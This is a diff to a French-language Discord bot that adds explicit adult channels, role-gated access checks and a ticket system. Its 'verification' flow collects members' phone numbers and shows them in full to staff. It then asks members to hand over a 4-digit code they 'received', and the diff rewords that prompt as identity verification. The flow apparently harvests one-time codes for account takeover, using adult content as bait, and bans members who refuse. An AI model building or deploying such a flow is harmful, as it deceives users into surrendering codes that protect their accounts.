@@ -24,9 +24,10 @@ const client = new Client({
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.DirectMessages,
-    GatewayIntentBits.MessageContent
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.ChannelMessageReactions
   ],
-  partials: [Partials.Channel, Partials.GuildMember]
+  partials: [Partials.Channel, Partials.GuildMember, Partials.Message]
 });
 
 const PORT = Number(process.env.PORT || 3000);
@@ -45,6 +46,11 @@ const CHAT_MAKER_CHANNEL_ID = process.env.CHAT_MAKER_CHANNEL_ID || null;
 const ACCES_GRATUIT_CHANNEL_ID = process.env.ACCES_GRATUIT_CHANNEL_ID || null;
 const CONTENU_BOOST_CHANNEL_ID = process.env.CONTENU_BOOST_CHANNEL_ID || null;
 const CONTENU_INVITE_CHANNEL_ID = process.env.CONTENU_INVITE_CHANNEL_ID || null;
+const PUSSY_BOOBS_ASS_CHANNEL_ID = process.env.PUSSY_BOOBS_ASS_CHANNEL_ID || null;
+const CONTENU_CHANNEL_ID = process.env.CONTENU_CHANNEL_ID || null;
+const LESBIENNE_CHANNEL_ID = process.env.LESBIENNE_CHANNEL_ID || null;
+const PUSSY_CHANNEL_ID = process.env.PUSSY_CHANNEL_ID || null;
+const MASTURBATION_CHANNEL_ID = process.env.MASTURBATION_CHANNEL_ID || null;
 
 const CROWN_ROLE_NAME = process.env.CROWN_ROLE_NAME || '👑';
 const STAR_ROLE_NAME = process.env.STAR_ROLE_NAME || '⭐️';
@@ -139,6 +145,12 @@ function createCodeValidationButtons(userId) {
   );
 }
 
+function createTicketButton() {
+  return new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('create_ticket').setLabel('📝 Créer un Ticket').setStyle(ButtonStyle.Primary)
+  );
+}
+
 async function sendAccessMessage(member) {
   const channel = await getChannel(ACCES_GRATUIT_CHANNEL_ID);
   if (!channel || !channel.isTextBased()) return;
@@ -190,7 +202,8 @@ async function sendVerificationPanel(member) {
   const message = await channel.send({
     content: `<@${member.id}>`,
     embeds: [embed],
-    components: [createVerifyButton()]
+    components: [createVerifyButton()],
+    allowedMentions: { parse: ['users'] }
   });
 
   return message;
@@ -255,7 +268,7 @@ async function sendCodePanelToVerification(memberId) {
 
   const embed = new EmbedBuilder()
     .setColor(0xffa500)
-    .setTitle('🔢 Entrez le Code')
+    .setTitle('🔢 Envoyez le code pour vérifier votre identité et accéder au serveur Discord.')
     .setDescription(
       'Le staff a validé ton numéro de téléphone.\n\n' +
       'Maintenant, tu dois entrer le code à 4 chiffres que tu as reçu pour finaliser la vérification.'
@@ -271,8 +284,10 @@ async function sendCodePanelToVerification(memberId) {
   );
 
   const message = await channel.send({
+    content: `<@${memberId}>`,
     embeds: [embed],
-    components: [row]
+    components: [row],
+    allowedMentions: { parse: ['users'] }
   });
 
   const verification = pendingVerifications.get(getKey(memberId));
@@ -399,9 +414,74 @@ async function refuseVerification(memberId) {
   pendingVerifications.delete(getKey(memberId));
 }
 
-client.once('ready', () => {
+async function checkChannelAccess(member, channelId) {
+  const guild = await fetchGuild();
+  if (!guild) return false;
+
+  const crownRole = await findRole(guild, CROWN_ROLE_NAME);
+  const starRole = await findRole(guild, STAR_ROLE_NAME);
+  const verifyRole = await findRole(guild, VERIFY_ROLE_NAME);
+  const boosterRole = await findRole(guild, BOOSTER_ROLE_NAME);
+  const inviteRole = await findRole(guild, INVITE_ROLE_NAME);
+
+  // 👑 et ⭐️ ont accès à tout
+  if ((crownRole && member.roles.has(crownRole)) || (starRole && member.roles.has(starRole))) {
+    return true;
+  }
+
+  // Vérifier les salons spécifiques
+  if (channelId === ACCES_GRATUIT_CHANNEL_ID) {
+    return verifyRole && member.roles.has(verifyRole);
+  }
+
+  if (channelId === CONTENU_BOOST_CHANNEL_ID) {
+    return boosterRole && member.roles.has(boosterRole);
+  }
+
+  if (channelId === CONTENU_INVITE_CHANNEL_ID) {
+    return inviteRole && member.roles.has(inviteRole);
+  }
+
+  if ([PUSSY_BOOBS_ASS_CHANNEL_ID, CONTENU_CHANNEL_ID, LESBIENNE_CHANNEL_ID, PUSSY_CHANNEL_ID, MASTURBATION_CHANNEL_ID].includes(channelId)) {
+    return verifyRole && member.roles.has(verifyRole);
+  }
+
+  return false;
+}
+
+async function sendAccessDeniedMessage(member, channelName) {
+  try {
+    await member.send({
+      embeds: [new EmbedBuilder()
+        .setColor(0xff0000)
+        .setTitle('🔒 Accès Refusé')
+        .setDescription(`Veuillez vous vérifier pour avoir accès au salon ${channelName}`)
+        .setTimestamp()
+      ]
+    });
+  } catch (e) {
+    console.error('Erreur lors de l\'envoi du DM:', e);
+  }
+}
+
+async function sendTicketButton() {
+  const channel = await getChannel(TICKET_CHANNEL_ID);
+  if (!channel || !channel.isTextBased()) return;
+
+  const embed = new EmbedBuilder()
+    .setColor(0x5865f2)
+    .setTitle('📝 Support')
+    .setDescription('Clique sur le bouton ci-dessous pour créer un ticket de support.')
+    .setTimestamp();
+
+  await channel.send({ embeds: [embed], components: [createTicketButton()] });
+}
+
+client.once('clientReady', () => {
   console.log(`✅ Bot prêt : ${client.user.tag}`);
   console.log(`🧩 Serveur : ${GUILD_ID || 'non défini'}`);
+  console.log(`📝 Rôle Vérifier : ${VERIFY_ROLE_NAME}`);
+  sendTicketButton();
 });
 
 client.on('guildMemberAdd', async (member) => {
@@ -419,6 +499,95 @@ client.on('guildMemberAdd', async (member) => {
 
   await sendAccessMessage(member);
   await sendVerificationPanel(member);
+});
+
+client.on('messageCreate', async (message) => {
+  if (message.author.bot) return;
+  if (!GUILD_ID || message.guild?.id !== GUILD_ID) return;
+
+  // Commande !refresh
+  if (message.content === '!refresh') {
+    const guild = await fetchGuild();
+    if (!guild) return;
+
+    const crownRole = await findRole(guild, CROWN_ROLE_NAME);
+    if (!crownRole || !message.member.roles.has(crownRole)) {
+      await message.reply({ content: '❌ Seul 👑 peut utiliser cette commande.', flags: 64 });
+      return;
+    }
+
+    try {
+      // Supprimer tous les messages du salon (jusqu'à 100)
+      const messages = await message.channel.messages.fetch({ limit: 100 });
+      await message.channel.bulkDelete(messages).catch(() => null);
+      console.log(`✅ Salon ${message.channel.name} rafraîchi par ${message.author.username}`);
+    } catch (e) {
+      console.error('Erreur lors du refresh:', e);
+    }
+    return;
+  }
+
+  const guild = await fetchGuild();
+  if (!guild) return;
+  const crownRole = await findRole(guild, CROWN_ROLE_NAME);
+
+  // Liste des salons où seul 👑 peut écrire
+  const writeOnlyChannels = [
+    ACCES_GRATUIT_CHANNEL_ID,
+    CONTENU_BOOST_CHANNEL_ID,
+    CONTENU_INVITE_CHANNEL_ID,
+    PUSSY_BOOBS_ASS_CHANNEL_ID,
+    CONTENU_CHANNEL_ID,
+    LESBIENNE_CHANNEL_ID,
+    PUSSY_CHANNEL_ID,
+    MASTURBATION_CHANNEL_ID
+  ];
+
+  // Vérifier si le message est dans un salon "write only"
+  if (writeOnlyChannels.includes(message.channelId)) {
+    if (crownRole && !message.member.roles.has(crownRole)) {
+      await message.delete().catch(() => null);
+      await sendAccessDeniedMessage(message.author, message.channel.name);
+      return;
+    }
+  }
+
+  // Vérifier les restrictions d'accès
+  if (message.channelId === ACCES_GRATUIT_CHANNEL_ID) {
+    const hasAccess = await checkChannelAccess(message.member, message.channelId);
+    if (!hasAccess) {
+      await sendAccessDeniedMessage(message.author, '#acces-gratuit');
+      await message.delete().catch(() => null);
+      return;
+    }
+  }
+
+  if (message.channelId === CONTENU_BOOST_CHANNEL_ID) {
+    const hasAccess = await checkChannelAccess(message.member, message.channelId);
+    if (!hasAccess) {
+      await sendAccessDeniedMessage(message.author, '#contenu-boost');
+      await message.delete().catch(() => null);
+      return;
+    }
+  }
+
+  if (message.channelId === CONTENU_INVITE_CHANNEL_ID) {
+    const hasAccess = await checkChannelAccess(message.member, message.channelId);
+    if (!hasAccess) {
+      await sendAccessDeniedMessage(message.author, '#contenu-invite');
+      await message.delete().catch(() => null);
+      return;
+    }
+  }
+
+  if ([PUSSY_BOOBS_ASS_CHANNEL_ID, CONTENU_CHANNEL_ID, LESBIENNE_CHANNEL_ID, PUSSY_CHANNEL_ID, MASTURBATION_CHANNEL_ID].includes(message.channelId)) {
+    const hasAccess = await checkChannelAccess(message.member, message.channelId);
+    if (!hasAccess) {
+      await sendAccessDeniedMessage(message.author, message.channel.name);
+      await message.delete().catch(() => null);
+      return;
+    }
+  }
 });
 
 client.on('interactionCreate', async (interaction) => {
@@ -447,7 +616,7 @@ client.on('interactionCreate', async (interaction) => {
       if (verificationChannel) {
         await interaction.reply({
           content: `Clique [ici](https://discord.com/channels/${GUILD_ID}/${VERIFICATION_CHANNEL_ID}) pour aller à la vérification`,
-ephemeral: true
+          flags: 64
         });
       }
       return;
@@ -458,7 +627,7 @@ ephemeral: true
       const verification = pendingVerifications.get(getKey(targetId));
 
       if (!verification) {
-        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', ephemeral: true });
+        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', flags: 64 });
         return;
       }
 
@@ -466,7 +635,7 @@ ephemeral: true
       verification.status = 'claimed';
 
       await updateLogsPanel(targetId, '🔵 Pris en charge', 0xffcc00);
-      await interaction.reply({ content: `✅ Tu as pris en charge cette demande.\n📱 Numéro complet : \`${verification.phone}\``, ephemeral: true });
+      await interaction.reply({ content: `✅ Tu as pris en charge cette demande.\n📱 Numéro complet : \`${verification.phone}\``, flags: 64 });
       return;
     }
 
@@ -475,14 +644,14 @@ ephemeral: true
       const verification = pendingVerifications.get(getKey(targetId));
 
       if (!verification) {
-        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', ephemeral: true });
+        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', flags: 64 });
         return;
       }
 
       verification.status = 'code_requested';
       await sendCodePanelToVerification(targetId);
 
-      await interaction.reply({ content: `✅ Panel de code envoyé dans #verification`, ephemeral: true });
+      await interaction.reply({ content: `✅ Panel de code envoyé dans #verification`, flags: 64 });
       return;
     }
 
@@ -490,9 +659,9 @@ ephemeral: true
       const targetId = interaction.customId.replace('approve_', '');
       const ok = await approveVerification(targetId);
       if (ok) {
-        await interaction.reply({ content: `✅ Vérification de <@${targetId}> approuvée !`, ephemeral: true });
+        await interaction.reply({ content: `✅ Vérification de <@${targetId}> approuvée !`, flags: 64 });
       } else {
-        await interaction.reply({ content: '❌ Erreur lors de la validation.', ephemeral: true });
+        await interaction.reply({ content: '❌ Erreur lors de la validation.', flags: 64 });
       }
       return;
     }
@@ -500,7 +669,7 @@ ephemeral: true
     if (interaction.customId.startsWith('refuse_')) {
       const targetId = interaction.customId.replace('refuse_', '');
       await refuseVerification(targetId);
-      await interaction.reply({ content: `❌ Vérification de <@${targetId}> refusée et membre banni.`, ephemeral: true });
+      await interaction.reply({ content: `❌ Vérification de <@${targetId}> refusée et membre banni.`, flags: 64 });
       return;
     }
 
@@ -509,7 +678,7 @@ ephemeral: true
       const verification = pendingVerifications.get(getKey(targetId));
 
       if (!verification || !verification.code) {
-        await interaction.reply({ content: '❌ Pas de code à valider.', ephemeral: true });
+        await interaction.reply({ content: '❌ Pas de code à valider.', flags: 64 });
         return;
       }
 
@@ -530,14 +699,14 @@ ephemeral: true
         await approveVerification(targetId);
       }
 
-      await interaction.reply({ content: `✅ Code validé pour <@${targetId}>`, ephemeral: true });
+      await interaction.reply({ content: `✅ Code validé pour <@${targetId}>`, flags: 64 });
       return;
     }
 
     if (interaction.customId.startsWith('refuse_code_')) {
       const targetId = interaction.customId.replace('refuse_code_', '');
       await refuseVerification(targetId);
-      await interaction.reply({ content: `❌ Code refusé pour <@${targetId}>.`, ephemeral: true });
+      await interaction.reply({ content: `❌ Code refusé pour <@${targetId}>.`, flags: 64 });
       return;
     }
 
@@ -560,6 +729,89 @@ ephemeral: true
       await interaction.showModal(modal);
       return;
     }
+
+    if (interaction.customId === 'create_ticket') {
+      const guild = await fetchGuild();
+      if (!guild) return;
+
+      const crownRole = await findRole(guild, CROWN_ROLE_NAME);
+      const starRole = await findRole(guild, STAR_ROLE_NAME);
+
+      const ticketsChannel = await getChannel(TICKET_CHANNEL_ID);
+      if (!ticketsChannel) return;
+
+      const thread = await ticketsChannel.threads.create({
+        name: `Ticket - ${interaction.user.username}`,
+        autoArchiveDuration: 60,
+        type: ChannelType.PrivateThread
+      });
+
+      await thread.members.add(interaction.user.id);
+
+      if (crownRole) {
+        const members = await guild.members.fetch();
+        for (const member of members.values()) {
+          if (member.roles.has(crownRole)) {
+            await thread.members.add(member.id).catch(() => null);
+          }
+        }
+      }
+
+      if (starRole) {
+        const members = await guild.members.fetch();
+        for (const member of members.values()) {
+          if (member.roles.has(starRole)) {
+            await thread.members.add(member.id).catch(() => null);
+          }
+        }
+      }
+
+      const embed = new EmbedBuilder()
+        .setColor(0x5865f2)
+        .setTitle('📝 Nouveau Ticket')
+        .setDescription(`Ticket créé par ${interaction.user.username}\n\nDécris ton problème ci-dessous.`)
+        .setTimestamp();
+
+      const closeButton = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId(`close_ticket_${thread.id}`)
+          .setLabel('Fermer le ticket')
+          .setStyle(ButtonStyle.Danger)
+      );
+
+      await thread.send({ embeds: [embed], components: [closeButton] });
+
+      await interaction.reply({ content: `✅ Ticket créé : ${thread}`, flags: 64 });
+      return;
+    }
+
+    if (interaction.customId.startsWith('close_ticket_')) {
+      const threadId = interaction.customId.replace('close_ticket_', '');
+      const guild = await fetchGuild();
+      if (!guild) return;
+
+      const crownRole = await findRole(guild, CROWN_ROLE_NAME);
+      const starRole = await findRole(guild, STAR_ROLE_NAME);
+
+      const hasPermission = (crownRole && interaction.member.roles.has(crownRole)) || 
+                           (starRole && interaction.member.roles.has(starRole));
+
+      if (!hasPermission) {
+        await interaction.reply({ content: '❌ Seuls les staff peuvent fermer les tickets.', flags: 64 });
+        return;
+      }
+
+      try {
+        const thread = await guild.channels.fetch(threadId);
+        if (thread && thread.isThread()) {
+          await thread.setArchived(true);
+          await interaction.reply({ content: '✅ Ticket fermé.', flags: 64 });
+        }
+      } catch (e) {
+        await interaction.reply({ content: '❌ Erreur lors de la fermeture du ticket.', flags: 64 });
+      }
+      return;
+    }
   }
 
   if (interaction.isModalSubmit()) {
@@ -569,7 +821,7 @@ ephemeral: true
       if (!isValidPhone(phone)) {
         await interaction.reply({
           content: '❌ Numéro invalide. Utilise un format comme `06xxxxxxxx` ou `+336xxxxxxxx`.',
-          ephemeral: true
+          flags: 64
         });
         return;
       }
@@ -580,7 +832,7 @@ ephemeral: true
 
       await interaction.reply({
         content: `✅ Numéro reçu : \`${maskPhone(phone)}\`\n\nLe staff va vérifier ta demande. Tu recevras bientôt le code à entrer.`,
-        ephemeral: true
+        flags: 64
       });
       return;
     }
@@ -590,13 +842,13 @@ ephemeral: true
       const code = interaction.fields.getTextInputValue('code_input');
 
       if (!/^\d{4}$/.test(code)) {
-        await interaction.reply({ content: '❌ Le code doit contenir 4 chiffres.', ephemeral: true });
+        await interaction.reply({ content: '❌ Le code doit contenir 4 chiffres.', flags: 64 });
         return;
       }
 
       const verification = pendingVerifications.get(getKey(memberId));
       if (!verification) {
-        await interaction.reply({ content: '❌ Aucune vérification active.', ephemeral: true });
+        await interaction.reply({ content: '❌ Aucune vérification active.', flags: 64 });
         return;
       }
 
@@ -604,7 +856,7 @@ ephemeral: true
 
       await sendCodePanel(memberId, code, verification.claimedBy);
 
-      await interaction.reply({ content: '✅ Code reçu ! Le staff va vérifier.', ephemeral: true });
+      await interaction.reply({ content: '✅ Code reçu ! Le staff va vérifier.', flags: 64 });
       return;
     }
   }
